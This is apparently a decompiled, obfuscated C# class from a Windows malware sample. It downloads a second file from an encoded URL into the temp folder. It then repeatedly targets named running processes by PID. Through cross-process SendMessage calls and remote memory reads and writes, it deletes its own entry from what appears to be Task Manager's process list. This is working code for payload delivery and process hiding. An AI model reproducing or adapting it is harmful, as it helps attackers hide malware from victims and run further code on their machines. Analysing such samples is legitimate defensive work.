using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace eltZnUpwRizyZ;

internal sealed class iYmwFcKSkoMOOW
{
	private struct TdtHGcJzGMq
	{
		public uint unLoGxUUWjR;

		public IntPtr bCvAKLZoJGZiAI;

		public IntPtr bTJgnhySXMCDPml;

		public uint lbsRYzBlcHAGNJ;

		public uint QTGEpmPmigt;

		public IntPtr EfDcbtkjEyBn;

		public uint hJWXfxfMath;

		public int KSMkoxbidI;

		public IntPtr VhyFxMbEnYHgzo;
	}

	private static volatile bool OoPxjkKyWx;

	public static volatile bool eAroZszptAG;

	[NonSerialized]
	internal static GetString _0098;

	public static string GeGRLGcNjBR()
	{
		if (IntPtr.Size == 8)
		{
			OPwDdsoVlNU.vvtVglKzWhlus = oHNFrnHwSQWRkS(new Uri(OPwDdsoVlNU.KsnoBrbTQSaN(_0098(107400346))));
		}
		else
		{
			OPwDdsoVlNU.vvtVglKzWhlus = oHNFrnHwSQWRkS(new Uri(OPwDdsoVlNU.KsnoBrbTQSaN(_0098(107400168))));
		}
		return OPwDdsoVlNU.vvtVglKzWhlus;
	}

	public static string oHNFrnHwSQWRkS(Uri P_0)
	{
		try
		{
			string path = Path.GetRandomFileName().Replace(_0098(107399542), _0098(107388412)).Remove(0, 3) + _0098(107399537);
			WebClient webClient = new WebClient();
			webClient.DownloadFile(P_0, Path.Combine(Path.GetTempPath(), path));
			return Path.Combine(Path.GetTempPath(), path);
		}
		catch
		{
		}
		return string.Empty;
	}

	public static Process qQLoyvfmrExI(string P_0)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (process.ProcessName.Contains(P_0))
			{
				return process;
			}
		}
		return null;
	}

	public static void xiDVoiTHkoM(string[] P_0)
	{
		string text = GeGRLGcNjBR();
		if (string.IsNullOrEmpty(text))
		{
			return;
		}
		while (true)
		{
			foreach (string text2 in P_0)
			{
				Process process = qQLoyvfmrExI(text2);
				if (process != null)
				{
					string text3 = process.Id.ToString();
					OPwDdsoVlNU.MkUJPBjeBrD(text, text3 + _0098(107386004) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName));
					OPwDdsoVlNU.MkUJPBjeBrD(text, text3 + _0098(107386004) + Path.GetFileName(Process.GetCurrentProcess().MainModule!.FileName) + _0098(107399496));
					OPwDdsoVlNU.MkUJPBjeBrD(text, text3 + _0098(107386004) + OPwDdsoVlNU.KsnoBrbTQSaN(_0098(107399519)));
					OPwDdsoVlNU.MkUJPBjeBrD(text, text3 + _0098(107386004) + OPwDdsoVlNU.KsnoBrbTQSaN(_0098(107386591)));
					OPwDdsoVlNU.MkUJPBjeBrD(text, text3 + _0098(107386004) + OPwDdsoVlNU.KsnoBrbTQSaN(_0098(107399462)));
					OPwDdsoVlNU.MkUJPBjeBrD(text, text3 + _0098(107386004) + OPwDdsoVlNU.KsnoBrbTQSaN(_0098(107399477)));
					OPwDdsoVlNU.MkUJPBjeBrD(text, text3 + _0098(107386004) + OPwDdsoVlNU.KsnoBrbTQSaN(_0098(107402539)));
					OPwDdsoVlNU.MkUJPBjeBrD(text, text3 + _0098(107386004) + OPwDdsoVlNU.KsnoBrbTQSaN(_0098(107399428)));
				}
			}
			Thread.Sleep(200);
		}
	}

	[DllImport("kernel32.dll", EntryPoint = "OpenProcess")]
	private static extern IntPtr mlrdPKRAQgX(int P_0, bool P_1, uint P_2);

	[DllImport("kernel32.dll", EntryPoint = "VirtualAllocEx", ExactSpelling = true, SetLastError = true)]
	private static extern IntPtr cLXvoqoqtaAS(IntPtr P_0, IntPtr P_1, uint P_2, int P_3, int P_4);

	[DllImport("kernel32.dll", EntryPoint = "VirtualFreeEx", ExactSpelling = true, SetLastError = true)]
	private static extern bool EdmgWylFeZAzvC(IntPtr P_0, IntPtr P_1, uint P_2, int P_3);

	[DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool FHzaVvvCfhYX(IntPtr PPKDGvcVpBM);

	[DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory", SetLastError = true)]
	private static extern bool KFkdZdsVrlZ(IntPtr xPiSiugcyLn, IntPtr SdZIQTIeYj, byte[] tOIdwqQDaNNtAG, uint fiwCSDQdoOahYn, out UIntPtr lHYyulhUtuuI);

	[DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory", SetLastError = true)]
	private static extern bool dumoUldSSInXyy(IntPtr LdxCeqBigWAWJ, IntPtr BSzAEgEoxyacPV, [Out] byte[] gLMWOzXiNYS, int AowhXkXFLlqhp, out UIntPtr AkSZjFvJMjTbC);

	[DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", SetLastError = true)]
	private static extern uint knqrsjyfAuz(IntPtr hLdiqFpMDFVB, out uint kDHqDyGuBgn);

	[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "SendMessage")]
	private static extern IntPtr AxUhHDANLzPTEQxZf(IntPtr P_0, uint P_1, IntPtr P_2, IntPtr P_3);

	[DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
	private static extern IntPtr SDcnHYabahp(string P_0, string P_1);

	[DllImport("user32.dll", EntryPoint = "FindWindowEx", SetLastError = true)]
	private static extern IntPtr qeCRADCXMxk(IntPtr P_0, IntPtr P_1, string P_2, string P_3);

	private static byte[] osGWycuiMmKJ(object P_0)
	{
		int num = Marshal.SizeOf(P_0);
		byte[] array = new byte[num];
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		Marshal.StructureToPtr(P_0, intPtr, fDeleteOld: true);
		Marshal.Copy(intPtr, array, 0, num);
		Marshal.FreeHGlobal(intPtr);
		return array;
	}

	private static IntPtr wjMhDZQnqdF(uint P_0)
	{
		return mlrdPKRAQgX(56, false, P_0);
	}

	private static void wciKbCEFQeYka(IntPtr P_0)
	{
		FHzaVvvCfhYX(P_0);
	}

	private static IntPtr uDgEnPpKsxKyMY(uint P_0, IntPtr P_1)
	{
		return cLXvoqoqtaAS(P_1, IntPtr.Zero, P_0, 12288, 4);
	}

	private static void suNLYzVwLff(IntPtr P_0, IntPtr P_1, uint P_2)
	{
		EdmgWylFeZAzvC(P_0, P_1, P_2, 32768);
	}

	private static IntPtr DJAaYdMpeg()
	{
		IntPtr intPtr = SDcnHYabahp(_0098(107399443), _0098(107399418));
		if (intPtr == IntPtr.Zero)
		{
			intPtr = SDcnHYabahp(_0098(107399385), _0098(107399376));
			intPtr = qeCRADCXMxk(intPtr, IntPtr.Zero, _0098(107399385), null);
			return qeCRADCXMxk(intPtr, IntPtr.Zero, _0098(107399359), _0098(107399818));
		}
		intPtr = qeCRADCXMxk(intPtr, IntPtr.Zero, _0098(107399385), null);
		return qeCRADCXMxk(intPtr, IntPtr.Zero, _0098(107399359), _0098(107399837));
	}

	private static IntPtr EsiktfsvOHYWHw(IntPtr P_0)
	{
		return AxUhHDANLzPTEQxZf(P_0, 4100u, IntPtr.Zero, IntPtr.Zero);
	}

	private static void MpfYegUzoXKfdz(IntPtr P_0, IntPtr P_1)
	{
		AxUhHDANLzPTEQxZf(P_0, 4104u, P_1, IntPtr.Zero);
	}

	private static void zoDpYiXFXYRohGJ(IntPtr P_0)
	{
		AxUhHDANLzPTEQxZf(P_0, 4124u, IntPtr.Zero, IntPtr.Zero);
	}

	private static string YeAqCmYgYGNE(IntPtr P_0, IntPtr P_1)
	{
		byte[] array = new byte[50];
		TdtHGcJzGMq tdtHGcJzGMq = default(TdtHGcJzGMq);
		knqrsjyfAuz(P_0, out var kDHqDyGuBgn);
		IntPtr intPtr = wjMhDZQnqdF(kDHqDyGuBgn);
		IntPtr intPtr2 = uDgEnPpKsxKyMY((uint)Marshal.SizeOf(tdtHGcJzGMq), intPtr);
		IntPtr intPtr3 = uDgEnPpKsxKyMY(50u, intPtr);
		tdtHGcJzGMq.bCvAKLZoJGZiAI = P_1;
		tdtHGcJzGMq.bTJgnhySXMCDPml = (IntPtr)0;
		tdtHGcJzGMq.hJWXfxfMath = 50u;
		tdtHGcJzGMq.EfDcbtkjEyBn = intPtr3;
		KFkdZdsVrlZ(intPtr, intPtr2, osGWycuiMmKJ(tdtHGcJzGMq), (uint)Marshal.SizeOf(tdtHGcJzGMq), out var lHYyulhUtuuI);
		AxUhHDANLzPTEQxZf(P_0, 4141u, P_1, intPtr2);
		dumoUldSSInXyy(intPtr, intPtr3, array, 50, out lHYyulhUtuuI);
		suNLYzVwLff(intPtr, intPtr2, (uint)Marshal.SizeOf(tdtHGcJzGMq));
		suNLYzVwLff(intPtr, intPtr3, 50u);
		wciKbCEFQeYka(intPtr);
		return Encoding.ASCII.GetString(array);
	}

	private static void mCtXEeApncQ(string P_0)
	{
		IntPtr intPtr = DJAaYdMpeg();
		if (!(intPtr != IntPtr.Zero))
		{
			return;
		}
		int num = (int)EsiktfsvOHYWHw(intPtr);
		for (int i = 0; i < num; i++)
		{
			string text = YeAqCmYgYGNE(intPtr, (IntPtr)i);
			if (text.Contains(P_0))
			{
				MpfYegUzoXKfdz(intPtr, (IntPtr)i);
			}
		}
	}

	private static void MilnUECHdWfvj()
	{
		IntPtr intPtr = DJAaYdMpeg();
		if (intPtr != IntPtr.Zero)
		{
			zoDpYiXFXYRohGJ(intPtr);
			zoDpYiXFXYRohGJ(intPtr);
			zoDpYiXFXYRohGJ(intPtr);
			zoDpYiXFXYRohGJ(intPtr);
			zoDpYiXFXYRohGJ(intPtr);
		}
	}

	public static void BcwzNoRHcDXpdnP()
	{
		Thread thread = new Thread(TBOkSOYlRgMCR);
		thread.Start();
	}

	private static void TBOkSOYlRgMCR()
	{
		while (!OoPxjkKyWx)
		{
			if (eAroZszptAG)
			{
				mCtXEeApncQ(Process.GetCurrentProcess().ProcessName + _0098(107399537));
				Thread.Sleep(525);
			}
			else
			{
				MilnUECHdWfvj();
				Thread.Sleep(1000);
			}
		}
		OoPxjkKyWx = false;
	}

	static iYmwFcKSkoMOOW()
	{
		Strings.CreateGetStringDelegate(typeof(iYmwFcKSkoMOOW));
		OoPxjkKyWx = false;
		eAroZszptAG = true;
	}
}
